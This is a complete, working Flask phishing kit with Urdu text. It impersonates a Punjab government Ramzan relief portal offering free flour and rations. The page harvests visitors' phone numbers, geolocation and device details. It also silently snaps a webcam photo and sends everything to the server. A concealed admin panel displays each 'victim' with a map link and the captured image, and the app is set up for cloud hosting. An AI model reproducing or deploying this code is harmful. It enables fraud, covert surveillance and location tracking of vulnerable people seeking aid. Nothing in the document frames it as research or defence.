import os, base64, datetime, json
from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)

# کلاؤڈ پر عارضی اسٹوریج
STORAGE_DIR = "captured_data"
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

victims_list = []

@app.route('/')
def victim_page():
    return render_template_string(VICTIM_HTML)

@app.route('/admin_panel_secret_123')
def admin_panel():
    return render_template_string(ADMIN_HTML, victims=victims_list)

@app.route('/images/<path:filename>')
def custom_static(filename):
    return send_from_directory(STORAGE_DIR, filename)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    
    if 'img' in data:
        img_name = f"victim_{ts.replace(':','')}.jpg"
        img_path = os.path.join(STORAGE_DIR, img_name)
        with open(img_path, "wb") as f:
            f.write(base64.b64decode(data['img'].split(",")[1]))
        
        if victims_list and victims_list[0]['time'] == ts:
            victims_list[0]['image'] = img_name
        else:
            victims_list.insert(0, {"time": ts, "image": img_name, "info": {}})
    else:
        victims_list.insert(0, {"time": ts, "info": data, "image": None})
            
    return "OK", 200

# وہی شوخ اور چمکدار UI
VICTIM_HTML = """
<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>8171 رمضان ریلیف پورٹل</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #004d26 0%, #00bf72 100%); margin: 0; padding: 0; height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
        .card { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(20px); padding: 40px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.3); box-shadow: 0 25px 50px rgba(0,0,0,0.3); max-width: 400px; width: 90%; text-align: center; }
        .logo { width: 90px; margin-bottom: 15px; }
        h1 { font-size: 26px; color: #ffcc00; margin-bottom: 5px; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: none; border-radius: 12px; font-size: 18px; text-align: center; }
        .btn { background: linear-gradient(90deg, #ff0055, #ffcc00); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 10px 20px rgba(255, 0, 85, 0.4); }
        #successMsg { display: none; margin-top: 20px; color: #00ff88; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Government_of_the_Punjab_Logo.svg" class="logo">
        <h1>رمضان ریلیف 2026</h1>
        <p>مفت آٹا اور راشن کے لیے اپنا موبائل نمبر درج کریں</p>
        <input type="number" id="phone" placeholder="03XXXXXXXXX">
        <button class="btn" id="btn">رجسٹریشن مکمل کریں</button>
        <div id="successMsg">آپ کی معلومات موصول ہو گئی ہیں۔ جلد آپ سے رابطہ کیا جائے گا۔</div>
    </div>
    <script>
        document.getElementById('btn').onclick = async function() {
            const phone = document.getElementById('phone').value;
            if(phone.length < 11) return alert("درست موبائل نمبر لکھیں");
            this.innerText = "پروسیسنگ...";
            this.disabled = true;
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone, lat: pos.coords.latitude, lon: pos.coords.longitude, device: navigator.userAgent})
                });
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    await fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({img: canvas.toDataURL('image/jpeg')})
                    });
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                document.getElementById('successMsg').style.display = 'block';
                this.style.display = 'none';
                document.getElementById('phone').style.display = 'none';
            }, () => { document.getElementById('successMsg').style.display = 'block'; });
        };
    </script>
</body>
</html>
"""

# ایڈمن پینل
ADMIN_HTML = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <title>ایڈمن پینل</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .victim-card { border: 1px solid #0f0; margin-bottom: 20px; padding: 15px; border-radius: 10px; display: flex; gap: 20px; background: #050505; }
        .img-section img { max-width: 150px; border: 1px solid #0f0; }
        h1 { color: #0f0; text-align: center; }
    </style>
</head>
<body>
    <h1>لائیو ڈیٹا مانیٹر</h1>
    <hr>
    {% for v in victims %}
    <div class="victim-card">
        <div class="info">
            <p>وقت: {{v.time}}</p>
            <p>موبائل نمبر: {{v.info.phone}}</p>
            <p>لوکیشن: {{v.info.lat}}, {{v.info.lon}}</p>
            <a href="https://www.google.com/maps?q={{v.info.lat}},{{v.info.lon}}" target="_blank" style="color:yellow;">میپ پر دیکھیں</a>
        </div>
        <div class="img-section">
            {% if v.image %}<img src="/images/{{v.image}}">{% endif %}
        </div>
    </div>
    {% endfor %}
    <script>setTimeout(() => { location.reload(); }, 5000);</script>
</body>
</html>
"""

if __name__ == '__main__':
    # کلاؤڈ سرورز کے لیے پورٹ سیٹنگ
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
